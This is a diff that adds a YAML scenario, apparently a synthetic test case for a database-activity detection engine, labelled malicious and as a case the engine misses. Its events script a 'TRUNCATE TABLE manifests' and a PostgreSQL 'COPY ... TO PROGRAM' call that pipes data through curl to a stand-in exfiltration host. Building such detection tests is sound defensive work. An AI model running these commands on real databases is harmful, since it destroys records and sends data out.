@@ -1,0 +1,23 @@
+scenario_id: gen_logistics_34_data_tamper_mal_854
+family_id: gen_logistics_34_data_tamper_mal_fam854
+domain: logistics
+time_of_day: '22:05'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: dispatcher
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5
+  events:
+  - step_id: act
+    sql: TRUNCATE TABLE manifests
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://analytics-mirror.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 45.77.168.188
+      port: 22
